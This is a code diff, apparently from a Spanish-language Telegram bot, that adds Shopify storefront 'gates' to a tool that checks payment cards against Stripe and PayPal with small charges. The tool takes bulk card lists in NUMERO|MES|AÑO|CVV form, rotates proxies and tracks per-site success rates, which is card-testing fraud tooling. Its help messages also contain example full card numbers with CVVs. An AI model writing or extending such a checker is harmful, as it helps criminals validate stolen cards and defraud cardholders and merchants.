+            "💳 *STRIPE $1.00*\n\nUsa: `/check NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/check 4169161481963022|09|2029|859`",
             parse_mode='Markdown'
+        )
+    
+    elif call.data == 'shopify_individual':
+        bot.send_message(
+            call.message.chat.id,
+            "🛍️ *AUTOSHOPIFY INDIVIDUAL*\n\nUsa: `/sh NUMERO|MES|AÑO|CVV`\n\nEjemplo: `/sh 4128717483067607|07|27|443`\n\nPara sitio específico: `/sh CC URL`",
+            parse_mode='Markdown'
+        )
+    
+    elif call.data == 'shopify_masivo':
+        bot.send_message(
+            call.message.chat.id,
+            "🛍️ *VERIFICACIÓN MASIVA SHOPIFY*\n\nUsa: `/msh`\n\nOpciones:\n`/msh --delay 3 --notificar 10`",
+            parse_mode='Markdown'
+        )
+    
+    elif call.data == 'add_sitio':
+        msg = bot.send_message(
+            call.message.chat.id,
+            "➕ *AÑADIR SITIO SHOPIFY*\n\nEnvía la URL del sitio:\n`https://tienda.myshopify.com`",
+            parse_mode='Markdown'
+        )
+        bot.register_next_step_handler(msg, procesar_add_sitio)
+    
+    elif call.data == 'listar_sitios':
+        cmd_listar_sitios(call.message)
+    
+    elif call.data == 'del_sitio':
+        msg = bot.send_message(
+            call.message.chat.id,
+            "🗑️ *ELIMINAR SITIO*\n\nEnvía la URL del sitio a eliminar:",
+            parse_mode='Markdown'
+        )
+        bot.register_next_step_handler(msg, procesar_del_sitio)
+    
+    elif call.data == 'del_all_sitios':
+        confirmacion = types.InlineKeyboardMarkup()
+        btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_sitios')
+        btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_sitios')
+        confirmacion.add(btn1, btn2)
+        bot.edit_message_text(
+            "⚠️ *¿ESTÁS SEGURO?*\n\nEsto eliminará TODOS los sitios guardados permanentemente.",
+            call.message.chat.id,
+            call.message.message_id,
+            parse_mode='Markdown',
+            reply_markup=confirmacion
         )
     
     elif call.data == 'menu_stats':
@@ -1515,8 +2052,13 @@ def callback_handler(call):
             "╠════════════════════════════╣\n"
             f"║ 🌐 PROXIES                 ║\n"
             f"║    📌 {stats['proxies']} guardados        ║\n"
-            f"║    ✅ {stats['exits']} éxitos         ║\n"
-            f"║    ❌ {stats['fallos']} fallos         ║\n"
+            f"║    ✅ {stats['exits_proxy']} éxitos       ║\n"
+            f"║    ❌ {stats['fallos_proxy']} fallos       ║\n"
+            f"╠════════════════════════════╣\n"
+            f"║ 🛍️ SITIOS                 ║\n"
+            f"║    📌 {stats['sitios']} guardados         ║\n"
+            f"║    ✅ {stats['exits_sitio']} éxitos        ║\n"
+            f"║    ❌ {stats['fallos_sitio']} fallos        ║\n"
             f"╠════════════════════════════╣\n"
             f"║ 💳 TARJETAS                ║\n"
             f"║    📋 {stats['tarjetas']} total          ║\n"
@@ -1531,7 +2073,7 @@ def callback_handler(call):
     elif call.data == 'menu_cargar':
         bot.send_message(
             call.message.chat.id,
-            "📁 *CARGAR ARCHIVO*\n\nEnvía un archivo .txt con:\n\n💳 Tarjetas: NUMERO|MES|AÑO|CVV\n🌐 Proxies: ip:puerto:user:pass\n\nEl bot detectará automáticamente qué es cada cosa.",
+            "📁 *CARGAR ARCHIVO*\n\nEnvía un archivo .txt con:\n\n💳 Tarjetas: NUMERO|MES|AÑO|CVV\n🌐 Proxies: ip:puerto:user:pass\n🛍️ Sitios: https://tienda.myshopify.com\n\nEl bot detectará automáticamente qué es cada cosa.",
             parse_mode='Markdown'
         )
     
@@ -1586,6 +2128,24 @@ def callback_handler(call):
             call.message.chat.id,
             call.message.message_id,
             reply_markup=menu_proxies()
+        )
+    
+    elif call.data == 'confirm_del_all_sitios':
+        cantidad = eliminar_todos_sitios()
+        bot.edit_message_text(
+            f"🗑️ *Se eliminaron {cantidad} sitios*",
+            call.message.chat.id,
+            call.message.message_id,
+            parse_mode='Markdown',
+            reply_markup=menu_shopify()
+        )
+    
+    elif call.data == 'cancel_del_all_sitios':
+        bot.edit_message_text(
+            "✅ Operación cancelada",
+            call.message.chat.id,
+            call.message.message_id,
+            reply_markup=menu_shopify()
         )
     
     elif call.data == 'test_proxies':
@@ -1662,6 +2222,30 @@ def procesar_del_proxy(message):
     
     bot.reply_to(message, texto, reply_markup=menu_principal())
 
+def procesar_add_sitio(message):
+    url = message.text.strip()
+    if guardar_sitio(url):
+        texto = (
+            "╔════════════════════════════╗\n"
+            "║     ✅ SITIO GUARDADO      ║\n"
+            "╠════════════════════════════╣\n"
+            f"║  {url[:30]}{'...' if len(url)>30 else ''}  ║\n"
+            "╚════════════════════════════╝"
+        )
+    else:
+        texto = "❌ Error: El sitio ya existe o URL inválida"
+    
+    bot.reply_to(message, texto, reply_markup=menu_principal())
+
+def procesar_del_sitio(message):
+    url = message.text.strip()
+    if eliminar_sitio(url):
+        texto = f"✅ Sitio eliminado: {url[:30]}"
+    else:
+        texto = "❌ Sitio no encontrado"
+    
+    bot.reply_to(message, texto, reply_markup=menu_principal())
+
 def procesar_del_tarjeta(message):
     tarjeta = message.text.strip()
     if eliminar_tarjeta(tarjeta):
@@ -1733,10 +2317,11 @@ def handle_document(message):
         downloaded_file = bot.download_file(file_info.file_path)
         contenido = downloaded_file.decode('utf-8')
         
-        # Detectar si son tarjetas o proxies
+        # Detectar tipo de contenido
         lineas = contenido.strip().split('\n')
         es_tarjeta = False
         es_proxy = False
+        es_sitio = False
         
         for linea in lineas[:5]:  # Revisar primeras 5 líneas
             linea = linea.strip()
@@ -1744,8 +2329,10 @@ def handle_document(message):
                 es_tarjeta = True
             elif re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+', linea):
                 es_proxy = True
+            elif re.match(r'^https?://[a-zA-Z0-9-]+\.myshopify\.com/?$', linea):
+                es_sitio = True
         
-        if es_tarjeta and not es_proxy:
+        if es_tarjeta and not es_proxy and not es_sitio:
             # Es archivo de tarjetas
             guardadas, repetidas, invalidas = guardar_tarjetas_desde_texto(contenido)
             texto = (
@@ -1771,8 +2358,21 @@ def handle_document(message):
                 "╚════════════════════════════╝"
             )
         
+        elif es_sitio:
+            # Es archivo de sitios Shopify
+            guardados, repetidos, invalidos = guardar_sitios_desde_texto(contenido)
+            texto = (
+                "╔════════════════════════════╗\n"
+                "║    ✅ SITIOS CARGADOS      ║\n"
+                "╠════════════════════════════╣\n"
+                f"║ 📦 Guardados: {guardados:<4}             ║\n"
+                f"║ 🔁 Repetidos: {repetidos:<4}             ║\n"
+                f"║ ❌ Inválidos: {invalidos:<4}             ║\n"
+                "╚════════════════════════════╝"
+            )
+        
         else:
-            texto = "❌ No se pudo identificar el tipo de archivo. Debe ser:\n💳 Tarjetas: NUMERO|MES|AÑO|CVV\n🌐 Proxies: ip:puerto:user:pass"
+            texto = "❌ No se pudo identificar el tipo de archivo. Debe ser:\n💳 Tarjetas: NUMERO|MES|AÑO|CVV\n🌐 Proxies: ip:puerto:user:pass\n🛍️ Sitios: https://tienda.myshopify.com"
         
         bot.edit_message_text(texto, message.chat.id, msg.message_id, reply_markup=menu_principal())
         
@@ -1797,27 +2397,27 @@ def default(message):
         bot.reply_to(message, "❓ Usa /menu para ver las opciones")
 
 if __name__ == "__main__":
-    print("="*70)
-    print("🤖 AUTO SHOPIFY BOT - VERSIÓN RAILWAY")
-    print("="*70)
+    print("="*80)
+    print("🤖 AUTO SHOPIFY BOT - VERSIÓN COMPLETA CON 3 GATES")
+    print("="*80)
     print("✅ Gates disponibles:")
-    print("   • Stripe: $5.00   → /check")
-    print("   • PayPal: $10.00  → /pp")
-    print("   • PayPal: $0.10   → /pp2")
-    print("   • PayPal: $1.00   → /pp3")
-    print("="*70)
+    print("   • Stripe: $1.00       → /check")
+    print("   • PayPal: $10         → /pp")
+    print("   • PayPal: $0.10       → /pp2")
+    print("   • PayPal: $1          → /pp3")
+    print("   • AutoShopify: variable → /sh")
+    print("="*80)
     print("✅ Comandos masivos:")
     print("   • Stripe masivo  → /mass")
-    print("   • PayPal masivo  → /mpp (con respuestas reales)")
-    print("="*70)
-    print("✅ Proxies:")
-    print("   • Envía archivo .txt")
-    print("   • /px - Testear proxies")
-    print("   • /proxies - Ver lista")
-    print("   • /delallproxy - Eliminar TODOS")
-    print("="*70)
+    print("   • PayPal masivo  → /mpp")
+    print("   • Shopify masivo → /msh")
+    print("="*80)
+    print("✅ Proxies y Sitios:")
+    print("   • /addproxy, /proxies, /px, /delallproxy")
+    print("   • /addsh, /sitios, /delsh, /delallsitios")
+    print("="*80)
     print("📱 Usa /menu para comenzar")
-    print("="*70)
+    print("="*80)
     
     # Para Railway, usamos polling con timeout
     try:
